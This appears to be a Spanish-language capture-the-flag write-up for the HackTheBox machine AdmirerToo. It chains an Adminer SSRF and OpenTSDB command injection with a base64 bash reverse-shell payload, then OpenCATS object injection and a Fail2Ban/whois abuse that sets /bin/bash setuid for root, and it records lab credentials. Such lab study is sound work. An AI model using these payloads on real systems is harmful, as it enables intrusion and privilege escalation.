# AdmirerToo

Tags: [[_webFuzzing]],[[_webExploitation]],[[_cve]],[[_internalPortAbusing]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Debian Buster</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

<span style="color:#ff669c">22</span> - SSH.
<span style="color:#ff669c">80</span> - HTTP.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> válidas.

<span style="color:#07b4f2">Probamos</span> <span style="color:#ecacb6">admirer_ro:1w4nn4b3adm1r3d2%21</span> pero nada.
<span style="color:#bef202">Vamos al 80</span>.


<span style="color:#ff669c">80</span>.
<span style="color:#ff2dc0">whatweb</span>.  <span style="color:#07b4f2">No</span> me dice <span style="color:#07b4f2">mucho</span>.
Desde la <span style="color:#ff2dc0">web</span>.
Hay imágenes, <span style="color:#ff2dc0">directory listing</span>
<span style="color:#ecacb6">/img</span> 

<span style="color:#07b4f2">Apartado</span> de <span style="color:#07b4f2">enviar mensaje</span>, hacemos <span style="color:#07b4f2">pruebas</span> pero <span style="color:#07b4f2">nada</span>.

<span style="color:#ff2dc0">Fuzzear</span> por recursos, al <span style="color:#07b4f2">probar</span> con un <span style="color:#ff2dc0">directorio</span> <span style="color:#07b4f2">erróneo</span>, vemos el <span style="color:#ecacb6">Not Found</span>, y en un mensaje <span style="color:#07b4f2">vemos</span> un <span style="color:#ff2dc0">dominio</span>
<span style="color:#ecacb6">admirer-gallery.htb</span>
Lo <span style="color:#07b4f2">metemos en</span> el <span style="color:#ecacb6">/etc/hosts</span>, pero <span style="color:#07b4f2">no cambia nada</span>.
El <span style="color:#ff2dc0">fuzzear</span> por <span style="color:#ff2dc0">recursos</span> <span style="color:#07b4f2">no</span> nos da <span style="color:#07b4f2">mucho</span>, pero <span style="color:#07b4f2">por</span> <span style="color:#ff2dc0">subdominios</span> sí, obtenemos
<span style="color:#ecacb6">db.admirer-gallery.htb</span>
Lo <span style="color:#07b4f2">metemos en</span> el <span style="color:#ecacb6">/etc/hosts</span>

<span style="color:#ecacb6">db.admirer-gallery.htb</span> :    desde la <span style="color:#ff2dc0">web</span>.
<span style="color:#ff2dc0">Adminer 4.7.8</span>
Hay un <span style="color:#ff2dc0">Login</span>, pero al <span style="color:#07b4f2">darle</span> a <span style="color:#ff2dc0">login</span>, <span style="color:#07b4f2">por detrás</span> ya <span style="color:#07b4f2">me</span> <span style="color:#ff2dc0">autentica</span>, interceptamos la <span style="color:#ff2dc0">petición</span> y vemos <span style="color:#ff2dc0">credenciales</span>.
<span style="color:#ecacb6">admirer_ro:11w4nn4b3adm1r3d2!</span> <span style="color:#bef202">vamos al 22</span>.
<span style="color:#07b4f2">Volvemos</span>.

<span style="color:#07b4f2">Buscamos</span> por <span style="color:#ff2dc0">vulnerabilidades</span> en <span style="color:#ff2dc0">Admirer</span> y <span style="color:#07b4f2">vemos</span> que hablan de <span style="color:#ff2dc0">SSRF</span>.
<span style="color:#ff2dc0">Repositorio</span>.
https://github.com/vrana/adminer 
<span style="color:#07b4f2">Buscamos</span> en Internet <span style="color:#ecacb6">vrana admirer ssrf elasticsearch</span> (<span style="color:#379075">vi algo de elasticsearch</span>) y llegamos a 
https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
Nos <span style="color:#07b4f2">dan</span> un <span style="color:#ff2dc0">script</span> https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd para <span style="color:#ff2dc0">montar</span> un <span style="color:#ff2dc0">servidor</span> y <span style="color:#07b4f2">obtener</span> la <span style="color:#ff2dc0">petición</span> <span style="color:#07b4f2">de</span> <span style="color:#ff2dc0">SSRF</span>.
Se hacen <span style="color:#07b4f2">cosas en</span> el <span style="color:#ff2dc0">login</span>, pero <span style="color:#07b4f2">nosotros</span> lo <span style="color:#07b4f2">haremos</span> <span style="color:#ff2dc0">interceptando</span> la <span style="color:#ff2dc0">petición</span> para <span style="color:#07b4f2">cambiar</span> los <span style="color:#07b4f2">valores</span>.
<span style="color:#07b4f2">Buscamos</span> en Internet <span style="color:#ecacb6">auth = elast in adminer</span> y encontramos <span style="color:#ecacb6">https://github.com/WikiSuite/adminer-elasticsearch/blob/master/adminer-elasticsearch.php</span>, donde <span style="color:#07b4f2">se ve el valor</span> de "<span style="color:#ecacb6">elastic</span>", que <span style="color:#07b4f2">es el que hay que poner</span> en <span style="color:#ecacb6">auth</span> del <span style="color:#ff2dc0">login</span> de <span style="color:#ff2dc0">Adminer</span>.

<span style="color:#bef202">Llevarlo a cabo</span>.
+Intercepto <span style="color:#ff2dc0">petición</span> del <span style="color:#ff2dc0">login</span> y <span style="color:#07b4f2">coloco</span>
<span style="color:#ecacb6">auth[driver]=elastic&auth[server]=10.10.14.15</span> 
Y <span style="color:#07b4f2">también</span> todo <span style="color:#07b4f2">lo demás</span>, claro.

+Ejecuto el <span style="color:#ecacb6">redirect.py</span> con <span style="color:#ff2dc0">python2</span>
<span style="color:#88c425">python redirect.py -p 80 -i 10.10.14.15 http://10.10.11.137</span>
<span style="color:#ecacb6">-p 80</span> es el <span style="color:#ff669c">puerto</span> donde <span style="color:#ff2dc0">monto</span> mi <span style="color:#ff2dc0">server</span>.
<span style="color:#ecacb6">-i</span> <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">IP</span> para <span style="color:#ff2dc0">montar</span> el <span style="color:#ff2dc0">server</span>.
<span style="color:#ecacb6">http://10.10.11.137</span> es la <span style="color:#ff2dc0">URL</span> <span style="color:#07b4f2">a la que redirijo</span> la <span style="color:#ff2dc0">petición</span> (<span style="color:#379075">para conseguir su contenido, o mejor dicho, hacerle una petición y como resultado obtenemos su contenido</span>).
<span style="color:#bef202">Importante</span>.
Si quiero <span style="color:#07b4f2">cargar</span> un <span style="color:#ff2dc0">recurso</span> <span style="color:#07b4f2">mío</span>, <span style="color:#07b4f2">como</span> <span style="color:#ff2dc0">URL Redirect</span>, debo <span style="color:#07b4f2">poner mi</span> <span style="color:#ff2dc0">URL</span> pero <span style="color:#07b4f2">de otro</span> <span style="color:#ff2dc0">servidor</span> <span style="color:#07b4f2">que</span> <span style="color:#ff2dc0">monte</span>, <span style="color:#07b4f2">por otro</span> <span style="color:#ff669c">puerto</span>.

De esta manera, <span style="color:#07b4f2">en</span> el <span style="color:#ff2dc0">login</span> de <span style="color:#ff2dc0">Adminer</span> <span style="color:#07b4f2">vemos</span> el <span style="color:#07b4f2">contenido</span> de la <span style="color:#ff2dc0">URL</span> <span style="color:#07b4f2">a la que redirigí </span>la <span style="color:#ff2dc0">petición</span>.

Al <span style="color:#07b4f2">investigar</span> vimos que <span style="color:#07b4f2">hablaban</span> de <span style="color:#ff2dc0">enumerar</span> <span style="color:#ff669c">puertos</span> <span style="color:#07b4f2">internos</span> del <span style="color:#ff2dc0">sistema</span>, e igualmente, <span style="color:#07b4f2">siempre</span> que haya un <span style="color:#ff2dc0">SSRF</span>, debemos <span style="color:#07b4f2">pensar</span> en un <span style="color:#ff2dc0">Internal Port Discovery</span>.
Como son <span style="color:#07b4f2">muchos</span> <span style="color:#ff669c">puertos</span>, podemos <span style="color:#ff2dc0">enumerar</span> con <span style="color:#ff2dc0">NMAP</span> los <span style="color:#ff669c">puertos</span> <span style="color:#ecacb6">filtered</span> (<span style="color:#379075">basta con quitar --open</span>), y tratar sobre ellos.
Contamos con el <span style="color:#ff669c">puerto 4242</span>.
Realizamos los <span style="color:#07b4f2">pasos anteriores</span> para <span style="color:#07b4f2">identificar</span> de <span style="color:#07b4f2">qué se trata</span>, y <span style="color:#07b4f2">vemos</span> su <span style="color:#ff2dc0">contenido</span>.

<span style="color:#ff2dc0">Open TSDB</span>
Investigando <span style="color:#07b4f2">encontramos</span> acerca de <span style="color:#ff2dc0">Unauthenticated Command Injection.</span>
Encontramos https://github.com/OpenTSDB/opentsdb/issues/2051, donde nos dan un <span style="color:#07b4f2">ejemplo</span> de <span style="color:#ff2dc0">payload</span>.

<span style="color:#bef202">Llevarlo a cabo</span>.
Tenemos que <span style="color:#07b4f2">llegar al</span> <span style="color:#ff669c">4242</span> a <span style="color:#07b4f2">través</span> del <span style="color:#ff2dc0">SSRF</span>.
+Intercepto <span style="color:#ff2dc0">petición</span> del <span style="color:#ff2dc0">login</span> y <span style="color:#07b4f2">coloco</span>
<span style="color:#ecacb6">auth[driver]=elastic&auth[server]=10.10.14.15</span> 
Y <span style="color:#07b4f2">también</span> todo <span style="color:#07b4f2">lo demás</span>, claro.

+Ejecuto el <span style="color:#ecacb6">redirect.py</span> con <span style="color:#ff2dc0">python2</span>
<span style="color:#88c425">python redirect.py -p 80 -i 10.10.14.15 "http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.15')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"</span>
Pero en la <span style="color:#ff2dc0">web</span> <span style="color:#07b4f2">vemos errores</span>, vamos a <span style="color:#07b4f2">solucionarlos</span>.
Error: <span style="color:#ecacb6">No such name for 'metrics': 'sys.cpu.nice'</span> 
<span style="color:#07b4f2">Buscamos</span> en Internet <span style="color:#ecacb6">list metrics opentsdb</span> y encontramos
https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http, vemos la <span style="color:#07b4f2">forma</span> de <span style="color:#07b4f2">listarlas</span>.
+Ejecuto el <span style="color:#ecacb6">redirect.py</span> con <span style="color:#ff2dc0">python2</span>
<span style="color:#88c425">python redirect.py -p 80 -i 10.10.14.15 "http://10.10.11.137:4242/api/suggest?type=metrics&max=20"</span> 
En la <span style="color:#ff2dc0">web</span> <span style="color:#07b4f2">vemos</span> una <span style="color:#ff2dc0">metric</span> <span style="color:#ecacb6">http.stats.web.hits</span>

+<span style="color:#07b4f2">Repetimos</span> lo mismo, pero ahora <span style="color:#07b4f2">en</span> la <span style="color:#ff2dc0">URL Redirect</span>, en lugar de <span style="color:#ecacb6">sum:sys.cpu.nice</span> ponemos <span style="color:#ecacb6">sum:http.stats.web.hits</span>

Y <span style="color:#07b4f2">recibimos</span> los <span style="color:#ff2dc0">ping</span>, entonces solo <span style="color:#07b4f2">haría falta cambiar</span> la parte de <span style="color:#ecacb6">[33:system('touch/tmp/poc.txt')]</span>
Recordemos que <span style="color:#07b4f2">debe estar</span> en <span style="color:#ff2dc0">URL encode</span>.
<span style="color:#ecacb6">[33:system('echo+YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80NDMgMD4mMScK|base64+-d|bash')]</span> 
Los <span style="color:#ecacb6">+</span> <span style="color:#07b4f2">en</span> el <span style="color:#ff2dc0">base64</span> (<span style="color:#379075">reverse shell</span>) están en <span style="color:#ff2dc0">Hex</span>, <span style="color:#ecacb6">%2B</span>
<span style="color:#07b4f2">Utilizamos</span> el <span style="color:#ff2dc0">payload</span> y pa deeentro.


## Escalada

Enumerar todo el sistema.
<span style="color:#ecacb6">Usuarios</span> válidos a <span style="color:#ff2dc0">nivel</span> de <span style="color:#ff2dc0">sistema</span>.
<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">jennifer</span>
<span style="color:#ecacb6">opentsdb</span> -> como el que estoy.

<span style="color:#07b4f2">Recordemos</span> que teníamos <span style="color:#ff2dc0">credenciales</span> de <span style="color:#07b4f2">antes</span>, pero <span style="color:#07b4f2">nada</span>.

Busquemos los <span style="color:#ff2dc0">archivos</span> de los <span style="color:#ff2dc0">servidores web</span>.
En <span style="color:#ecacb6">/var/www/adminer/plugins/data/servers.php</span> vemos <span style="color:#ff2dc0">credenciales</span>. <span style="color:#07b4f2">Probamos</span> y
<span style="color:#ecacb6">jennifer:bQ3u7^AxzcB7qAsxE3</span>

Vemos <span style="color:#ff669c">puertos</span> <span style="color:#ff2dc0">internos</span>, e identificamos el <span style="color:#ff669c">8080</span>
Le hacemos un <span style="color:#ff2dc0">curl</span> y tiene <span style="color:#07b4f2">contenido</span>, nos <span style="color:#07b4f2">lo traemos con</span> el mismo <span style="color:#ff2dc0">SSH</span> y un <span style="color:#ff2dc0">Local Port Forwarding</span>.

<span style="color:#ff2dc0">OpenCATS</span>.
Estamos en un <span style="color:#ff2dc0">login</span>, probamos <span style="color:#ecacb6">jennifer:bQ3u7^AxzcB7qAsxE3</span> y <span style="color:#07b4f2">entramos</span> y es la versión <span style="color:#ecacb6">0.9.5.2</span>
<span style="color:#07b4f2">Investigando</span> vemos <span style="color:#07b4f2">cosas</span> de <span style="color:#ff2dc0">RCE</span>, <span style="color:#ff2dc0">Object Injection</span>.
Llegamos a https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/, <span style="color:#379075">de Object Injection</span>.
Hay que <span style="color:#07b4f2">utilizar</span> <span style="color:#ff2dc0">phpggc</span>, https://github.com/ambionics/phpggc

<span style="color:#07b4f2">Antes</span> de llevarlo a cabo, <span style="color:#07b4f2">entendamos quién</span> <span style="color:#ff2dc0">corre</span> el <span style="color:#ff2dc0">server</span>, los <span style="color:#ff2dc0">archivos</span> de los que es <span style="color:#07b4f2">propietario</span>, etc.
<span style="color:#88c425">find / -name "*opencats*" 2>/dev/null</span> :    vemos <span style="color:#ecacb6">/etc/apache2-opencats </span>
<span style="color:#88c425">cat apache2.conf | grep -v "^#" | sed '/^\s*$/d'</span> :    vemos que <span style="color:#ecacb6">devel</span> está como <span style="color:#07b4f2">usuario</span> y <span style="color:#07b4f2">grupo</span>, es quien <span style="color:#ff2dc0">corre</span> el <span style="color:#ff2dc0">OpenCATS</span>. <span style="color:#07b4f2">Existe en</span> el <span style="color:#ff2dc0">sistema</span>.

<span style="color:#88c425">find / -group devel -type d 2>/dev/null</span>
<span style="color:#ecacb6">/usr/local/src</span>
<span style="color:#ecacb6">/usr/local/etc</span>
<span style="color:#379075">Podemos probar en alguna de estas para escribir un archivo</span>.

<span style="color:#bef202">Llevarlo a cabo</span>.
+<span style="color:#ff2dc0">Ejecutar phpggc</span>.
<span style="color:#88c425">./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/test.txt test.txt</span> :    <span style="color:#07b4f2">me da</span> un "<span style="color:#ecacb6">payloadSerialized</span>".
<span style="color:#ecacb6">usr/local/etc/test.txt</span> es el <span style="color:#07b4f2">archivo</span> a <span style="color:#07b4f2">crear en</span> la <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#ecacb6">test.txt</span> es un <span style="color:#07b4f2">archivo local</span> en <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span>.

+Hacemos una <span style="color:#ff2dc0">petición</span> estando <span style="color:#ff2dc0">autenticado</span> <span style="color:#07b4f2">a</span>
<span style="color:#ecacb6">http://localhost:8686/index.php?m=activity&parametersactivity%3AActivityDataGrid="payloadSerialized"</span>
Se <span style="color:#07b4f2">crea</span> el <span style="color:#ff2dc0">archivo</span> con cierto <span style="color:#ff2dc0">formato</span>
<span style="color:#ecacb6">[{"Expires":1,"Discard":false,"Value":"Esto es una prueba\n"}]</span>
Pero ahora, <span style="color:#07b4f2">qué más</span> podemos <span style="color:#07b4f2">hacer</span>?, toca <span style="color:#07b4f2">investigar</span>...
En <span style="color:#ecacb6">/var/log</span> vemos <span style="color:#ecacb6">fail2ban.log</span>


<span style="color:#ff2dc0">Fail2Ban</span>. Se puede <span style="color:#07b4f2">configurar</span> para que cuando <span style="color:#07b4f2">alguien intente acceder</span> a un <span style="color:#ff2dc0">servicio</span> y se <span style="color:#07b4f2">equivoque</span> varias veces en sus <span style="color:#ff2dc0">credenciales</span>, <span style="color:#07b4f2">se le banee la</span> <span style="color:#ff2dc0">IP</span>.
<span style="color:#07b4f2">Investigando</span> encontramos algo de <span style="color:#ff2dc0">MisConfiguration</span>, de <span style="color:#ff2dc0">RCE</span>.
https://research.securitum.com/fail2ban-remote-code-execution/, <span style="color:#379075">de RCE</span>.
Yo hago un <span style="color:#07b4f2">archivo con</span>
<span style="color:#ecacb6">~! whoami</span>
Y si <span style="color:#07b4f2">hago</span>
<span style="color:#88c425">cat test | /usr/bin/mail -s "whatever" whatever@whatever.com</span> :    se <span style="color:#ff2dc0">ejecuta</span> el <span style="color:#ff2dc0">comando</span>, pero <span style="color:#07b4f2">como</span> el <span style="color:#ecacb6">usuario</span> <span style="color:#07b4f2">actual</span>.
<span style="color:#ecacb6">"whatever"</span> y demás <span style="color:#07b4f2">cosas erróneas</span> es para eso, <span style="color:#07b4f2">ocasionar</span> un <span style="color:#07b4f2">error</span>.

Pero se puede <span style="color:#07b4f2">jugar con más,</span> con el <span style="color:#ff2dc0">whois</span>, esto porque <span style="color:#07b4f2">cuando banean</span> una <span style="color:#ff2dc0">IP</span>, <span style="color:#07b4f2">se le aplica</span> un <span style="color:#ff2dc0">whois</span> (<span style="color:#379075">lo vemos en el actionban = ...</span>).
Investigando, buscamos <span style="color:#ecacb6">whois.conf</span> y encontramos https://gist.github.com/thde/3890aa48e03a2b551374, es un <span style="color:#07b4f2">ejemplo</span> de cómo se vería el <span style="color:#ecacb6">whois.conf</span> en la <span style="color:#07b4f2">vida real</span>.
<span style="color:#88c425">strace whois 127.0.0.1</span> :    ver a <span style="color:#ff2dc0">bajo nivel</span>, y llegamos a ver una <span style="color:#ff2dc0">llamada</span> <span style="color:#07b4f2">a</span> <span style="color:#ecacb6">/usr/local/etc/whois.conf</span>, que <span style="color:#07b4f2">de primeras no tengo acceso</span> o <span style="color:#07b4f2">no existe</span> pero... <span style="color:#ff9a57">¿nos suena de algo?</span>, es la <span style="color:#ff2dc0">ruta</span> de la que <span style="color:#ecacb6">devel</span> <span style="color:#07b4f2">es</span> <span style="color:#ff2dc0">grupo</span> y en donde <span style="color:#07b4f2">antes logramos escribir</span> un <span style="color:#ff2dc0">archivo</span>, aprovechando el <span style="color:#ff2dc0">Object Injection</span> en <span style="color:#ff2dc0">OpenCATS</span>.

<span style="color:#bef202">La idea</span>.
Aprovechar el <span style="color:#ff2dc0">OpenCATS PHP Object Injection to Arbitrary File Write</span> y <span style="color:#07b4f2">crear</span> un <span style="color:#ecacb6">whois.conf</span> en <span style="color:#ecacb6">/usr/local/etc/</span>, que es donde <span style="color:#ff2dc0">whois llama</span> al <span style="color:#ff2dc0">archivo</span> de <span style="color:#07b4f2">configuración</span>.
Para que al <span style="color:#07b4f2">abusar</span> del <span style="color:#ff2dc0">Fail2Ban</span>, nos <span style="color:#ff2dc0">ejecute</span> un <span style="color:#ff2dc0">comando</span>.

<span style="color:#bef202">Llevarlo a cabo</span>.
+<span style="color:#ff2dc0">Ejecutar phpggc</span>.
<span style="color:#88c425">./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf</span> 
<span style="color:#ecacb6">whois.conf </span>debe tener el <span style="color:#ff2dc0">formato</span> <span style="color:#07b4f2">correcto</span>, como <span style="color:#ecacb6">10.10.14.15 10.10.14.15</span>
<span style="color:#379075">Regex Address</span>

+Hacemos una <span style="color:#ff2dc0">petición</span> estando <span style="color:#ff2dc0">autenticado</span> <span style="color:#07b4f2">a</span>
<span style="color:#ecacb6">http://localhost:8686/index.php?m=activity&parametersactivity%3AActivityDataGrid="payloadSerialized"</span>
Se <span style="color:#07b4f2">crear</span> el <span style="color:#ff2dc0">archivo</span>.

+Ejecutar <span style="color:#ff2dc0">whois</span> en <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#88c425">whois 10.10.14.15</span> :    da error, porque el <span style="color:#ff2dc0">archivo</span> que creamos <span style="color:#07b4f2">tiene</span> un <span style="color:#ff2dc0">formato</span> <span style="color:#07b4f2">raro</span>, pero lo podemos <span style="color:#07b4f2">arreglar</span> <span style="color:#07b4f2">para</span> que la <span style="color:#ff2dc0">regex</span> que <span style="color:#ff2dc0">interpreta</span>, <span style="color:#07b4f2">no moleste</span>.
Principio,<span style="color:#ecacb6"> [asasasda]*hola </span>-> <span style="color:#07b4f2">resulta</span> en "<span style="color:#ecacb6">hola</span>".
<span style="color:#ecacb6">[{"Expires":1,"Discard":false,"Value":"]*10.10.14.15 10.10.14.15\n"}]</span>
Va por buen camino, pero nos <span style="color:#07b4f2">falta quitar</span> lo <span style="color:#07b4f2">último</span>, investigamos el <span style="color:#ff2dc0">código fuente</span> de <span style="color:#ff2dc0">whois</span>, https://github.com/rfc1036/whois
En <span style="color:#ecacb6">whois.c</span> en la <span style="color:#07b4f2">línea 426</span> está una <span style="color:#ff2dc0">función</span> que hay que <span style="color:#07b4f2">entender</span>.
<span style="color:#ecacb6">char buf[512]</span> 
Podríamos <span style="color:#07b4f2">meter 512 espacios</span> para que <span style="color:#07b4f2">no alcance</span> a <span style="color:#07b4f2">llegar</span> al <span style="color:#ff2dc0">salto de línea</span> y <span style="color:#07b4f2">demás</span>.
<span style="color:#88c425">python3 -c 'print("]*10.10.14.15 10.10.14.15" + " "*512)'</span> :    me lo <span style="color:#07b4f2">copio</span> con <span style="color:#07b4f2">todo y espacios</span>.

+Volvemos a <span style="color:#ff2dc0">ejecutar phpggc</span>, esta vez <span style="color:#07b4f2">con</span> el <span style="color:#07b4f2">contenido</span> que <span style="color:#07b4f2">diseñamos arriba</span> para el <span style="color:#ecacb6">whois.conf</span>

+Volvemos a <span style="color:#07b4f2">aplicar</span> el <span style="color:#ff2dc0">Object Injection</span> en <span style="color:#ff2dc0">OpenCATS</span>.

+Volvemos a <span style="color:#ff2dc0">ejecutar</span> el <span style="color:#ff2dc0">whois</span> en <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#07b4f2">Me pongo</span> en <span style="color:#ff2dc0">escucha</span> por el <span style="color:#ff669c">puerto 43</span> (<span style="color:#379075">ahí opera whois</span>).
<span style="color:#88c425">whois 10.10.14.15</span>
Y ya <span style="color:#07b4f2">recibo</span> la <span style="color:#ff2dc0">petición</span>.

+<span style="color:#ff2dc0">Abusar</span> del <span style="color:#ff2dc0">Fail2Ban</span>.
En <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creo</span> un <span style="color:#ff2dc0">archivo</span> con
<span style="color:#ecacb6">Línea necesaria con cualquier cosa</span>
<span style="color:#ecacb6">~! chmod 4755 
/bin/bash</span>
<span style="color:#88c425">nc -nlvp 43</span> < <span style="color:#88c425">pwned</span> :    <span style="color:#07b4f2">pasando</span> el <span style="color:#ff2dc0">archivo</span>.

Ahora, <span style="color:#07b4f2">me tienen que banear</span>, para ello <span style="color:#07b4f2">me</span> <span style="color:#ff2dc0">autentico</span> como <span style="color:#07b4f2">loco</span> por <span style="color:#ff2dc0">SSH</span> hasta que lo hagan, <span style="color:#07b4f2">en este punto</span>, como ya <span style="color:#07b4f2">vimos</span> en el <span style="color:#ecacb6">actionban =</span> ..., <span style="color:#07b4f2">me va a aplicar </span>un <span style="color:#ff2dc0">whois</span>, <span style="color:#07b4f2">recibo</span> la <span style="color:#ff2dc0">petición</span> y <span style="color:#07b4f2">ahí le cuela</span> el <span style="color:#ff2dc0">comando</span>.
Y como <span style="color:#ecacb6">root</span> <span style="color:#07b4f2">aplica</span> las <span style="color:#07b4f2">reglas</span> de <span style="color:#ff2dc0">iptables</span>, el <span style="color:#ff2dc0">comando</span> es <span style="color:#ff2dc0">privilegiado</span>.

<span style="color:#88c425">bash -p</span> y pa deeeentro.
Fin.
